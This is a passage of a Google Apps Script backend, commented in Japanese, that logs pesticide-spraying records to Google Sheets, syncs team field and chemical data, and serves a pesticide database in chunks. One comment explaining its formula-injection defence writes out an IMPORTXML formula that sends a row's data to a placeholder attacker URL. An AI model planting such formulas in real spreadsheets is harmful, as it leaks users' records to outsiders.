// ════════════════════════════════════════════════════════
//  薬液調合ノート — 防除記録受信スクリプト v3(Google Apps Script)
//  ★1回の散布 = シート1行(薬剤は1つのセルにまとめて記載)
//
//  【新規設置】
//  1. Googleスプレッドシートを新規作成
//  2. 拡張機能 → Apps Script → このコードを貼り付けて保存
//  3. デプロイ → 新しいデプロイ → ウェブアプリ
//     (実行: 自分 ／ アクセス: 全員)
//  4. ウェブアプリのURL(…/exec)をアプリの設定に貼り付け
//
//  【農薬データ(chemdb.json)の置き場所】
//  アプリには農薬登録データを同梱していません(FAMICの利用規約により再配布しない
//  方針のため)。各自でデータを用意し、このスクリプト経由で端末に配ります。
//  1. リポジトリ直下で `python tools/update_chemdb.py` を実行し chemdb.json を作る
//     (できたファイルはリポジトリにコミットしないこと)
//  2. 自分のGoogleドライブに chemdb.json をアップロードする
//  3. そのファイルを開いたときのURL
//     https://drive.google.com/file/d/【ここがファイルID】/view
//     からファイルIDをコピーする
//  4. Apps Script の左メニュー「プロジェクトの設定」(歯車)→「スクリプト プロパティ」
//     → プロパティ名: CHEMDB_FILE_ID ／ 値: 手順3のファイルID → 保存
//     ※未設定の場合はドライブ内で "chemdb.json" という名前のファイルを探します。
//       同名ファイルが複数あると意図しないほうを掴むので、IDの設定を推奨します。
//  5. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//  6. 各端末のアプリで 設定タブ →「農薬データ」→「⬇ 農薬データを取り込む」
//  取り込んだデータは端末内(IndexedDB)に保存されるので、以後は圏外でも検索できます。
//
//  【v2からの更新】
//  1. Apps Script のコードをこの内容に差し替えて保存
//  2. シート下部のタブ「防除記録」を右クリック → 名前を変更
//     (例:「防除記録_旧」)※旧形式のデータを残すため
//  3. デプロイ → デプロイを管理 → 鉛筆 → バージョン「新バージョン」→ デプロイ
//     (URLは変わらないので、スマホ側の再設定は不要)
//  次の受信時に、新しい1行形式の「防除記録」シートが自動で作られます。
//
//  【合言葉(SHARED_SECRET)の設定 ※強く推奨】
//  ウェブアプリのアクセスを「全員」にしている都合上、/exec のURLさえ
//  知られると、第三者が記録の追記・チーム共有データの読み出し/上書きを
//  実行できてしまいます。これを防ぐため、合言葉を設定してください。
//  1. Apps Script の左メニュー「プロジェクトの設定」(歯車)を開く
//  2. 「スクリプト プロパティ」→「スクリプト プロパティを追加」
//  3. プロパティ名: SHARED_SECRET ／ 値: 任意の長い文字列
//     (推測されにくいもの。例: 英数字20文字以上。パスワードの使い回しは避ける)
//  4. 「スクリプト プロパティを保存」を押す
//  5. アプリ側の設定画面の「合言葉」欄に、同じ文字列を入力する
//  ※未設定でも従来どおり動きます(既存の設置を壊さないため)。ただし
//    その場合はアプリの接続テストに「未設定です」と表示されます。
// ════════════════════════════════════════════════════════

const SHEET_NAME = "防除記録";

const HEADERS = [
  "受信日時",     // 1
  "記録ID",       // 2
  "散布日",       // 3
  "記録者",       // 4
  "圃場",         // 5
  "作物",         // 6
  "面積(a)",      // 7
  "薬剤数",       // 8
  "薬剤内容",     // 9  例: 薬剤A(フロアブル・10倍・1000mL) / 薬剤B(乳剤・16倍・625mL)
  "総量(L)",      // 10
  "水量(L)",      // 11
  "実散布量(L)",  // 12
  "状態",         // 13 調合済 / 散布済
  "報告日",       // 14
  "備考",         // 15
];
const COL = {
  ID: 2, AREA: 7, CHEM_N: 8, CHEM_TEXT: 9, TOTAL: 10, WATER: 11,
  SPRAYED: 12, STATUS: 13, REPORT_DATE: 14, MEMO: 15,
};

// ── セルに書く文字列を「数式ではない」ものとして固定する ──
// 圃場名や備考にそのまま任せると、= や + で始まる文字列がスプレッドシート側で
// 数式として評価されてしまう(数式インジェクション)。たとえば
//   =IMPORTXML("https://攻撃者/?d="&TEXTJOIN(",",1,A2:O2),"//x")
// と入力された記録を1行追記しただけで、その行の中身が外部へ送信される。
// 先頭にアポストロフィを付けると、Sheetsは以降を必ず文字列として扱う
// (画面上・CSV出力ともアポストロフィは表示されない)。
// タブ・改行始まりも、前方の空白が無視されて数式と判定されうるので同じ扱いにする。
function safeCell_(v) {
  if (v === null || v === undefined) return "";
  if (typeof v === "number" || typeof v === "boolean" || v instanceof Date) return v;
  const s = String(v);
  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
}

// ── 合言葉(スクリプトプロパティ SHARED_SECRET)の照合 ──
// 未設定なら null を返す。呼び出し側はその場合、従来どおり素通しする。
function sharedSecret_() {
  const s = PropertiesService.getScriptProperties().getProperty("SHARED_SECRET");
  return s ? String(s) : null;
}

// 定数時間に近い比較。=== は先頭が違った時点で false を返すため、応答時間の差から
// 1文字ずつ合言葉を当てられる余地がある(GASは呼び出しごとの揺らぎが大きく現実的な
// 脅威ではないが、比較の書き方としてこちらを既定にする)。
// 長さの違いだけは隠せないので、短いほうを空文字で埋めて必ず全文字を走査する。
function secretEquals_(a, b) {
  const x = String(a == null ? "" : a);
  const y = String(b == null ? "" : b);
  const n = Math.max(x.length, y.length);
  let diff = x.length ^ y.length;
  for (let i = 0; i < n; i++) {
    diff |= (x.charCodeAt(i) || 0) ^ (y.charCodeAt(i) || 0);
  }
  return diff === 0;
}

function getSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_NAME);
  if (!sh) sh = ss.insertSheet(SHEET_NAME);
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold").setBackground("#EDF5EE");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 散布日ごとに行の背景色を塗り分ける(同じ散布日は同色、日付が変わると色が切り替わる)
const DATE_COLORS = [
  "#FFFFFF", // 白
  "#EAF4EA", // 薄緑
  "#FDF3E0", // 薄オレンジ
  "#E8F1FA", // 薄青
  "#F6ECF6", // 薄紫
];

function colorByDate_(sh) {
  const last = sh.getLastRow();
  if (last < 2) return;
  const n = last - 1;
  const dates = sh.getRange(2, 3, n, 1).getValues(); // 3列目 = 散布日
  const colorOf = {};   // 散布日 → 色
  let next = 0;         // 次に割り当てる色の番号
  const bg = [];
  for (let i = 0; i < n; i++) {
    const v = dates[i][0];
    const key = (v instanceof Date)
      ? Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd")
      : String(v || "");
    if (!(key in colorOf)) {
      colorOf[key] = DATE_COLORS[next % DATE_COLORS.length];
      next++;
    }
    const c = colorOf[key];
    bg.push(new Array(HEADERS.length).fill(c));
  }
  sh.getRange(2, 1, n, HEADERS.length).setBackgrounds(bg);
}

// 既存の全行を塗り直す(GASエディタから手動実行)
function recolorAll() {
  colorByDate_(getSheet_());
}

// 旧レイアウトのヘッダー行を現行HEADERSに貼り直す(GASエディタから1回だけ手動実行)
function fixHeaders() {
  const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);
  if (!sh) throw new Error("シートがありません: " + SHEET_NAME);
  const lastCol = Math.max(sh.getLastColumn(), HEADERS.length);
  sh.getRange(1, 1, 1, lastCol).clearContent();
  sh.getRange(1, 1, 1, HEADERS.length).setValues([HEADERS])
    .setFontWeight("bold").setBackground("#EDF5EE");
  sh.setFrozenRows(1);
}

// 指定した記録IDの行番号を返す(なければ0)
function findRow_(sh, recordId) {
  if (sh.getLastRow() < 2) return 0;
  const ids = sh.getRange(2, COL.ID, sh.getLastRow() - 1, 1).getValues().flat();
  for (let i = 0; i < ids.length; i++) {
    if (String(ids[i]) === String(recordId)) return i + 2;
  }
  return 0;
}

// チーム共有データ用のシート(チームコード / データ / 保存日時 / 保存者)
function getShareSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName("_共有データ");
  if (!sh) {
    sh = ss.insertSheet("_共有データ");
    sh.appendRow(["チームコード", "データ", "保存日時", "保存者"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#EAF3FA");
    sh.setFrozenRows(1);
  }
  return sh;
}
// 共有データの上書き履歴シート。cloudSave は1チーム1行を丸ごと置き換えるため、
// 誤操作や古い端末からの保存で、他の人が入れた圃場・薬剤が一瞬で消えうる。
// 上書き直前の値をここに積んでおけば、コピーして戻すだけで復旧できる。
const SHARE_LOG_NAME = "_共有データ履歴";
const SHARE_LOG_MAX = 200; // これを超えたら古い行から捨てる(シートの肥大化を防ぐ)

function getShareLogSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHARE_LOG_NAME);
  if (!sh) {
    sh = ss.insertSheet(SHARE_LOG_NAME);
    sh.appendRow(["保存日時", "チームコード", "保存者", "直前のデータ"]);
    sh.getRange(1, 1, 1, 4).setFontWeight("bold").setBackground("#F3EEE6");
    sh.setFrozenRows(1);
  }
  return sh;
}

// 上書き前の値を1行残す。prev が空(初回保存)なら記録しない。
function pushShareLog_(team, by, prev, when) {
  if (!prev) return;
  const sh = getShareLogSheet_();
  sh.appendRow([when, safeCell_(team), safeCell_(by), safeCell_(prev)]);
  const over = (sh.getLastRow() - 1) - SHARE_LOG_MAX; // 1行目はヘッダー
  if (over > 0) sh.deleteRows(2, over); // 2行目 = いちばん古い履歴
}

// チームコードの行番号を返す(なければ0)
function findShareRow_(sh, team) {
  if (sh.getLastRow() < 2) return 0;
  const teams = sh.getRange(2, 1, sh.getLastRow() - 1, 1).getValues().flat();
  for (let i = 0; i < teams.length; i++) {
    if (String(teams[i]) === String(team)) return i + 2;
  }
  return 0;
}

// ══════════ 進捗共有:圃場・作業を「1件1行」で持つ ══════════
// 旧 cloudSave は 1チーム=1セルにJSON全体を詰め、丸ごと置き換える方式だった。
// この方式だと次の3つが同時に起きる。
//   (1) 誰かの保存が、他の人が入れた実績をまとめて消す(last-write-wins)
//   (2) 1セル上限に当たり、圃場を増やすと保存できなくなる(45,000文字で断っている)
//   (3) 他の端末の進捗を読む手段がない
// 進捗マップは(3)が要るので、レコード単位の表に作り直す。
// 旧方式(cloudSave / cloudLoad)は残す。並行稼働させて段階的に移行するため。

const FIELD_SHEET = "圃場マスタ";
const WORK_SHEET = "作業";

// ── 「編集日時」と「更新日時」を分けている理由 ──
// 編集日時 = その端末が値を書き換えた時刻(アプリが付ける)。競合の勝ち負けに使う。
// 更新日時 = サーバーが行を書いた時刻(GASが付ける)。差分取得(since)に使う。
// 1つにまとめると、pull した端末が次に push したとき「サーバーが付けた時刻」を
// 編集時刻として送り返すことになり、自分の更新が常に最新と判定されて
// 他人の変更を踏み潰す。逆に編集日時だけにすると、時計のずれた端末の行が
// since の範囲から漏れて永久に配られない。用途が違うので列を分ける。
const FIELD_HEADERS = [
  "圃場ID",   // 0
  "チームコード", // 1
  "名称",     // 2
  "作物",     // 3
  "地区",     // 4
  "面積a",    // 5
  "中心lat",  // 6
  "中心lng",  // 7
  "ポリゴン", // 8  座標配列のJSON
  "編集日時", // 9  端末が付けた時刻(ISO)
  "更新日時", // 10 サーバーが付けた時刻(ISO)
  "更新者",   // 11
  "更新端末", // 12
  "削除",     // 13 論理削除
];
const FIELD_ID_COL = 0, FIELD_EDIT_COL = 9, FIELD_AT_COL = 10;

const WORK_HEADERS = [
  "作業ID",     // 0
  "チームコード", // 1
  "作業日",     // 2
  "圃場ID",     // 3
  "圃場名",     // 4
  "状態",       // 5  planned / mixed / done
  "予定L",      // 6
  "実績L",      // 7
  "実績面積a",  // 8
  "薬剤数",     // 9
  "薬剤内容",   // 10
  "記録者",     // 11
  "更新端末",   // 12
  "実績入力日時", // 13
  "編集日時",   // 14
  "更新日時",   // 15
  "削除",       // 16
];
const WORK_ID_COL = 0, WORK_EDIT_COL = 14, WORK_AT_COL = 15;

// 薬剤マスタ。ID は「薬剤名を正規化した文字列」で、アプリ側が付ける。
// 圃場・作業は数字のIDを持つが、薬剤はもともと名前が主キーで、
// 同じ薬剤を別のIDで二重登録させないために名前をそのままIDにする。
const CHEM_SHEET = "薬剤マスタ";
const CHEM_HEADERS = [
  "薬剤ID",   // 0  正規化した薬剤名
  "チームコード", // 1
  "薬剤名",   // 2
  "種類",     // 3  fungicide / insecticide など
  "剤型",     // 4  sc / wp など
  "使用回数の上限", // 5
  "編集日時", // 6  端末が付けた時刻(ISO)
  "更新日時", // 7  サーバーが付けた時刻(ISO)
  "更新者",   // 8
  "更新端末", // 9
  "削除",     // 10 論理削除
];
const CHEM_ID_COL = 0, CHEM_EDIT_COL = 6, CHEM_AT_COL = 7;

// 1回の push で受け付ける最大件数。GASの実行時間(6分)に当たる前に断る。
// 超えたぶんはアプリ側が分割して送り直す。無言で切り捨てない。
const PUSH_MAX = 300;

// 更新日時は ISO8601 の文字列で持つ。Date のまま入れるとシートのタイムゾーンや
// 表示形式に引きずられ、差分取得(since より新しい行)の比較がずれる。
// ISO文字列なら辞書順の比較がそのまま時刻の比較になる。
function isoNow_() {
  return new Date().toISOString();
}

// ヘッダー行を現行の定義に合わせる。列を増やした版へ差し替えたとき、
// 古いヘッダーのまま新しい幅で書き込むと見出しと中身がずれるため、
// シートを掴むたびに幅だけ確認する。
function getRecSheet_(name, headers, headBg) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(name);
  if (!sh) sh = ss.insertSheet(name);
  if (sh.getLastRow() === 0) {
    sh.appendRow(headers);
    sh.getRange(1, 1, 1, headers.length).setFontWeight("bold").setBackground(headBg);
    sh.setFrozenRows(1);
    return sh;
  }
  const cur = sh.getRange(1, 1, 1, headers.length).getValues()[0];
  let same = true;
  for (let i = 0; i < headers.length; i++) {
    if (String(cur[i]) !== headers[i]) { same = false; break; }
  }
  if (!same) {
    sh.getRange(1, 1, 1, headers.length).setValues([headers])
      .setFontWeight("bold").setBackground(headBg);
    sh.setFrozenRows(1);
  }
  return sh;
}
function getFieldSheet_() { return getRecSheet_(FIELD_SHEET, FIELD_HEADERS, "#EDF5EE"); }
function getWorkSheet_()  { return getRecSheet_(WORK_SHEET,  WORK_HEADERS,  "#EAF3FA"); }
function getChemSheet_()  { return getRecSheet_(CHEM_SHEET,  CHEM_HEADERS,  "#F3EEF8"); }

// ── 圃場1件 → 行 ──
// 文字列はすべて safeCell_ を通す。圃場名・地区はユーザーの自由入力で、
// "=" 始まりだとシート側で数式として評価される(数式インジェクション)。
function fieldRow_(f, team, at) {
  const c = Array.isArray(f.center) ? f.center : [];
  return [
    String(f.id),
    safeCell_(team),
    safeCell_(f.name || ""),
    safeCell_(f.crop || ""),
    safeCell_(f.area || ""),
    Number(f.areaA) || "",
    Number(c[0]) || "",
    Number(c[1]) || "",
    safeCell_(JSON.stringify(f.polygon || [])),
    safeCell_(String(f.updatedAt || "")),
    at,
    safeCell_(f.by || ""),
    safeCell_(f.deviceId || ""),
    f.deleted ? 1 : "",
  ];
}

function fieldObj_(r) {
  // ポリゴンが壊れていても、その圃場1件を落とすだけで済ませる。
  // ここで例外を投げると pull 全体が失敗し、他の圃場まで配られなくなる。
  let poly = [];
  try {
    const raw = String(r[8] || "");
    if (raw) poly = JSON.parse(raw);
  } catch (err) {
    poly = [];
  }
  const lat = r[6], lng = r[7];
  return {
    id: Number(r[0]),
    name: String(r[2] || ""),
    crop: String(r[3] || ""),
    area: String(r[4] || ""),
    areaA: r[5] === "" ? "" : Number(r[5]),
    center: (lat === "" || lng === "") ? null : [Number(lat), Number(lng)],
    polygon: Array.isArray(poly) ? poly : [],
    updatedAt: String(r[FIELD_EDIT_COL] || ""),
    serverAt: String(r[FIELD_AT_COL] || ""),
    by: String(r[11] || ""),
    deleted: !!r[13],
  };
}

// ── 作業1件 → 行 ──
function workRow_(w, team, at) {
  return [
    String(w.id),
    safeCell_(team),
    safeCell_(w.workDate || ""),
    String(w.fieldId),
    safeCell_(w.fieldName || ""),
    safeCell_(w.status || "planned"),
    Number(w.plannedL) || "",
    Number(w.sprayedL) || "",
    Number(w.reportAreaA) || "",
    Number(w.chemCount) || 0,
    safeCell_(w.chemText || ""),
    safeCell_(w.by || ""),
    safeCell_(w.deviceId || ""),
    safeCell_(String(w.reportedAt || "")),
    safeCell_(String(w.updatedAt || "")),
    at,
    w.deleted ? 1 : "",
  ];
}

function workObj_(r) {
  return {
    id: Number(r[0]),
    workDate: String(r[2] || ""),
    fieldId: Number(r[3]),
    fieldName: String(r[4] || ""),
    status: String(r[5] || "planned"),
    plannedL: r[6] === "" ? 0 : Number(r[6]),
    sprayedL: r[7] === "" ? 0 : Number(r[7]),
    reportAreaA: r[8] === "" ? "" : Number(r[8]),
    chemCount: Number(r[9]) || 0,
    chemText: String(r[10] || ""),
    by: String(r[11] || ""),
    reportedAt: String(r[13] || ""),
    updatedAt: String(r[WORK_EDIT_COL] || ""),
    serverAt: String(r[WORK_AT_COL] || ""),
    deleted: !!r[16],
  };
}

// ── 薬剤1件 → 行 ──
function chemRow_(c, team, at) {
  return [
    safeCell_(String(c.id)),
    safeCell_(team),
    safeCell_(c.name || ""),
    safeCell_(c.use || ""),
    safeCell_(c.form || ""),
    Number(c.maxUse) || "",
    safeCell_(String(c.updatedAt || "")),
    at,
    safeCell_(c.by || ""),
    safeCell_(c.deviceId || ""),
    c.deleted ? 1 : "",
  ];
}

function chemObj_(r) {
  return {
    id: String(r[0]),
    name: String(r[2] || ""),
    use: String(r[3] || ""),
    form: String(r[4] || ""),
    maxUse: r[5] === "" ? "" : Number(r[5]),
    updatedAt: String(r[CHEM_EDIT_COL] || ""),
    serverAt: String(r[CHEM_AT_COL] || ""),
    deleted: !!r[10],
  };
}

// ── 上書き前の値を履歴シートへ退避する ──
// 圃場だけを対象にしている。圃場のポリゴンは現場で1枚ずつ手で囲んだもので、
// 消えると囲み直すしかない。作業は日ごとに作られ、確定した内容は「防除記録」
// シートにも残るため、ここで二重に積むとログが作業で埋まって
// 肝心の圃場の履歴が SHARE_LOG_MAX で押し出される。
function pushRecLogs_(logs) {
  if (!logs.length) return;
  const sh = getShareLogSheet_();
  sh.getRange(sh.getLastRow() + 1, 1, logs.length, 4).setValues(logs);
  const over = (sh.getLastRow() - 1) - SHARE_LOG_MAX;
  if (over > 0) sh.deleteRows(2, over);
}

// ── upsert:IDが一致する行は上書き、無ければ追記 ──
//
// 上書きするかどうかは「編集日時」の比較で決める。後から届いたほうが必ず勝つ、
// にはしない。圏外に長く居た端末が電波復帰時に古い内容を送り返してきたとき、
// 新しい実績を巻き戻してしまうため。編集日時が空(旧版の端末)のときだけ、
// 判定材料が無いので素通しする。
//
// 書き込みは最後に1回の setValues でまとめる。1行ずつ setValue を呼ぶと
// 件数ぶんラウンドトリップが発生し、初回の一括投入で6分制限に当たる。
function upsertRows_(sh, headers, idCol, editCol, incoming, toRow, team, logKind) {
  const width = headers.length;
  const last = sh.getLastRow();
  const rows = last >= 2 ? sh.getRange(2, 1, last - 1, width).getValues() : [];
  const idx = {};
  for (let i = 0; i < rows.length; i++) idx[String(rows[i][idCol])] = i;

  const at = isoNow_();
  const logs = [];
  let updated = 0, added = 0, skipped = 0;

  for (let k = 0; k < incoming.length; k++) {
    const item = incoming[k];
    if (!item || item.id === undefined || item.id === null || item.id === "") {
      skipped++;
      continue;
    }
    const key = String(item.id);
    const values = toRow(item, team, at);
    if (key in idx) {
      const i = idx[key];
      const prevEdit = String(rows[i][editCol] || "");
      const newEdit = String(item.updatedAt || "");
      if (newEdit && prevEdit && newEdit < prevEdit) {
        skipped++;
        continue;
      }
      if (logKind) {
        logs.push([at, safeCell_(team), safeCell_(item.by || ""),
                   safeCell_(logKind + " " + JSON.stringify(rows[i]))]);
      }
      rows[i] = values;
      updated++;
    } else {
      idx[key] = rows.length;
      rows.push(values);
      added++;
    }
  }

  if (updated > 0 || added > 0) {
    sh.getRange(2, 1, rows.length, width).setValues(rows);
  }
  pushRecLogs_(logs);
  return { ok: true, added: added, updated: updated, skipped: skipped, serverTime: at };
}

// ── 差分取得:since より後にサーバーが書いた行だけ返す ──
function pullRows_(sh, headers, atCol, team, since, mapper) {
  const last = sh.getLastRow();
  if (last < 2) return [];
  const rows = sh.getRange(2, 1, last - 1, headers.length).getValues();
  const s = String(since || "");
  const out = [];
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    if (!r[0] && r[0] !== 0) continue;              // 空行
    if (team && String(r[1]) !== String(team)) continue;
    if (s && String(r[atCol] || "") <= s) continue;
    out.push(mapper(r));
  }
  return out;
}

// ── 進捗マップ用の軽い応答 ──
// ポリゴンを返さない。座標は各端末が既に持っていて、地図が要るのは
// 「どの圃場が何色か」だけ。応答が小さいほど電波の弱い場所でも通る。
function progressItems_(team, from, to) {
  const sh = getWorkSheet_();
  const last = sh.getLastRow();
  if (last < 2) return [];
  const rows = sh.getRange(2, 1, last - 1, WORK_HEADERS.length).getValues();
  const out = [];
  for (let i = 0; i < rows.length; i++) {
    const r = rows[i];
    if (!r[0] && r[0] !== 0) continue;
    if (team && String(r[1]) !== String(team)) continue;
    if (r[16]) continue;                            // 削除済み
    const d = String(r[2] || "");
    if (from && d < from) continue;
    if (to && d > to) continue;
    out.push({
      fieldId: Number(r[3]),
      workDate: d,
      status: String(r[5] || "planned"),
      sprayedL: r[7] === "" ? 0 : Number(r[7]),
      areaA: r[8] === "" ? "" : Number(r[8]),
      by: String(r[11] || ""),
      at: String(r[13] || r[WORK_AT_COL] || ""),
    });
  }
  return out;
}

// ══════════ 農薬データ(chemdb.json)の配信 ══════════
// Googleドライブに置いた chemdb.json を読み、分割して返す。
// アプリ側は part=0 から順に呼び、chunk を連結して JSON.parse する。
//
// なぜ分割するのか:
//   chemdb.json は約940KB。ContentService が1回の応答で返せる大きさの上限は
//   公式に明示されておらず、環境によって変わりうる。1回で返す前提で作ると
//   「ある人の環境では動くが、ある人の環境では無言で切れる」という最悪の壊れ方をする。
//   最初から分割して返せば、上限がいくつであっても既定の25万文字が通れば動く。

const CHEMDB_DEFAULT_CHUNK = 250000; // 1パートの文字数(コードユニット)の既定値
const CHEMDB_MAX_CHUNK = 400000;     // 端末から大きすぎる値を指定されても、ここで頭打ちにする

// 配信するファイルを特定する。スクリプトプロパティ CHEMDB_FILE_ID を優先し、
// 未設定ならドライブ内の "chemdb.json" という名前のファイルにフォールバックする。
// 見つからなければ null。
function chemdbFile_() {
  const id = PropertiesService.getScriptProperties().getProperty("CHEMDB_FILE_ID");
  if (id) {
    try {
      return DriveApp.getFileById(String(id).trim());
    } catch (err) {
      // IDの打ち間違い・削除済み・権限なし。名前での検索に落として復旧の芽を残す。
      // 詳細(err)は返さない。ドライブの内部事情を外に出す必要がない。
    }
  }
  const it = DriveApp.getFilesByName("chemdb.json");
  return it.hasNext() ? it.next() : null;
}

// ── キャッシュしない判断について ──
// 毎回ドライブから読み直すのは遅い(1パートごとに1回読む)。CacheService に載せられれば
// 速くなるが、CacheService は1項目100KBが上限。chemdb.json は約940KB、1パートでも
// 25万文字(UTF-8で数百KB)あり、全体はもちろん1パートすら入らない。
// 100KB未満に切り刻んで10数個のキーに分けて入れることは理屈上は可能だが、
// 一部だけ失効したときに古い断片と新しい断片が混ざり、壊れたJSONを配ってしまう。
// 取り込みは各端末で数か月に1回の操作なので、速度より確実さを取ってキャッシュしない。

// part 番目のチャンクを返す。
function chemdbChunk_(part, size) {
  const file = chemdbFile_();
  if (!file) return { ok: false, error: "chemdb not found" };

  // getDataAsString("UTF-8") でバイト列を文字列にしてから切る。
  // バイト単位で切ると日本語(UTF-8で3バイト)が途中で割れて壊れるため、必ず文字列にしてから切る。
  const text = file.getBlob().getDataAsString("UTF-8");
  const len = text.length; // JSの文字列長 = UTF-16コードユニット数

  let step = Math.floor(Number(size) || CHEMDB_DEFAULT_CHUNK);
  if (!(step > 0)) step = CHEMDB_DEFAULT_CHUNK;
  if (step > CHEMDB_MAX_CHUNK) step = CHEMDB_MAX_CHUNK;

  const n = Math.max(0, Math.floor(Number(part) || 0));
  let start = n * step;
  if (start >= len) return { ok: false, error: "part out of range" };
  let end = Math.min(start + step, len);

  // ── サロゲートペアを割らない ──
  // substring はコードユニット単位なので、境界がサロゲートペアの真ん中に来ると
  // 上位・下位が別パートに分かれ、連結する前の各チャンクが壊れた文字を含む。
  // (連結すれば元に戻るとはいえ、途中で文字数を数えたりログに出したりすると化ける)
  // 境界の直前が上位サロゲート(U+D800〜U+DBFF)なら1つ手前で切り、下位サロゲートを次のパートへ送る。
  // start 側は「前のパートが同じ規則で切った位置」と一致させる必要があるので、同じ判定を行う。
  const backOffIfSplit = (pos) => {
    if (pos <= 0 || pos >= len) return pos;
    const c = text.charCodeAt(pos - 1);
    return (c >= 0xD800 && c <= 0xDBFF) ? pos - 1 : pos;
  };
  start = backOffIfSplit(start);
  end = backOffIfSplit(end);

  // 全パート数。境界がずれても1文字ぶんなので、切り上げで数えた値とパート番号は必ず一致する
  // (ずれるのは各パートの長さだけで、step 文字ずつ進む点は変わらない)。
  const total = Math.max(1, Math.ceil(len / step));
  return {
    ok: true,
    part: n,
    total: total,
    // bytes = ファイルのバイト数(進捗表示・整合確認用)。分割の基準は文字数なので
    // chars も返す。日本語が多いぶん bytes は chars の2〜3倍になる。
    bytes: file.getSize(),
    chars: len,
    chunk: text.substring(start, end)
  };
}

// 薬剤リストを1セル用の文字列にまとめる(用途・剤型・倍率・薬量)
// 薬剤名はユーザーが自由に入力できる(プリセット名)ので、
// 連結後の文字列を safeCell_ に通してから返す。
function chemsText_(chems) {
  return safeCell_(chems.map(function (c) {
    var parts = [];
    if (c.useName) parts.push(c.useName);
    if (c.formName) parts.push(c.formName);
    parts.push((c.ratio || "?") + "倍");
    parts.push(Math.round(Number(c.ml) || 0) + "mL");
    return (c.name || "(無名)") + "(" + parts.join("・") + ")";
  }).join(" / "));
}

// 1散布ぶんの行データを作る
function buildRow_(data, status) {
  const rec = data.record;
  const now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  // 文字列の項目は safeCell_ を通す(数式インジェクション対策)。
  // 数値の項目は Number() を通しているので、数式になりようがない。
  return [
    now,
    safeCell_(String(rec.id)),
    safeCell_(rec.date || ""),
    safeCell_(data.recorder || ""),
    safeCell_(rec.field || ""),
    safeCell_(rec.crop || ""),
    Number(rec.reportAreaA || rec.areaA) || "",
    rec.chems.length,
    chemsText_(rec.chems),
    Number(rec.totalL) || 0,
    Math.round(Number(rec.waterMl) || 0) / 1000, // mL→L
    status === "散布済" ? (Number(rec.sprayedL) || "") : "",
    status,
    safeCell_(status === "散布済" ? (rec.reportDate || "") : ""),
    safeCell_((status === "散布済" ? (rec.reportMemo || rec.memo) : rec.memo) || ""),
  ];
}

// ── 読み取り専用の処理 ──
// 呼び出し元(doPost)で合言葉の照合を済ませてから入る。ここでは認証しない。
// シートに書き込む処理を絶対に足さないこと。ロックを取らずに走るため、
// ここで書くと他の端末の書き込みと競合してデータが壊れる。
function doRead_(type, data) {
  if (type === "chemdbLoad") {
    return json_(chemdbChunk_(data.part, data.size));
  }

  if (type === "cloudLoad") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const sh = getShareSheet_();
    const row = findShareRow_(sh, data.team);
    if (row <= 0) return json_({ ok: true, payload: null });
    const payload = sh.getRange(row, 2).getValue();
    return json_({ ok: true, payload: payload || null });
  }

  if (type === "pull") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const since = String(data.since || "");
    // serverTime は「この応答が含む範囲の終わり」。次回の since に使う。
    // 読む前に採っておく。読んでいる最中に他の端末が書いた行は、次回もう一度
    // 配られるだけで済む。読んだ後に採ると、その行を永久に取りこぼす。
    const serverTime = isoNow_();
    return json_({
      ok: true,
      fields: pullRows_(getFieldSheet_(), FIELD_HEADERS, FIELD_AT_COL, data.team, since, fieldObj_),
      works:  pullRows_(getWorkSheet_(),  WORK_HEADERS,  WORK_AT_COL,  data.team, since, workObj_),
      chems:  pullRows_(getChemSheet_(),  CHEM_HEADERS,  CHEM_AT_COL,  data.team, since, chemObj_),
      serverTime: serverTime,
    });
  }

  if (type === "progress") {
    if (!data.team) return json_({ ok: false, error: "team required" });
    const from = String(data.from || data.date || "");
    const to = String(data.to || data.date || "");
    return json_({
      ok: true,
      items: progressItems_(data.team, from, to),
      serverTime: isoNow_(),
    });
  }

  return json_({ ok: false, error: "unknown type" });
}

// ── 受信(アプリからのPOST) ──
function doPost(e) {
  // ── 読み取りだけのリクエストはロックを取らずに先に処理する ──
  // 以前は全種類がスクリプトロックを取っていた。進捗マップの「最新を取得」は
  // 散布中に何度も押されるが、そのとき他の端末が実績を送っていると
  // ロック待ちで10秒たって "busy" が返る。読むだけの処理は他と競合しないので、
  // 書き込み系より前で返してしまう。
  let head = null;
  try {
    head = JSON.parse(e.postData.contents);
  } catch (err) {
    return json_({ ok: false, error: "invalid json" });
  }
  const headSecret = sharedSecret_();
  if (headSecret && !secretEquals_(headSecret, head.auth)) {
    return json_({ ok: false, error: "auth" });
  }
  const headType = head.type || "record";
  if (headType === "pull" || headType === "progress" || headType === "cloudLoad" ||
      headType === "chemdbLoad") {
    try {
      return doRead_(headType, head);
    } catch (err) {
      return json_({ ok: false, error: String(err) });
    }
  }

  const lock = LockService.getScriptLock();
  // tryLock はロックを取れなくても例外を投げない。以前は waitLock を try の外で
  // 呼んでいたため、取得に失敗すると finally の releaseLock() が
  // 「ロックを持っていない」という二次例外を出し、本当の原因が隠れていた。
  if (!lock.tryLock(10000)) {
    // 他の端末の送信と競合しただけ。アプリ側は未送信のまま再送すればよい。
    return json_({ ok: false, error: "busy" });
  }
  try {
    const data = JSON.parse(e.postData.contents);

    // ── 合言葉の照合 ──
    // スクリプトプロパティ SHARED_SECRET が設定されているときだけ検証する。
    // 未設定の既存デプロイをいきなり弾くと現場の記録が止まるため、後方互換を優先。
    const secret = sharedSecret_();
    if (secret && !secretEquals_(secret, data.auth)) {
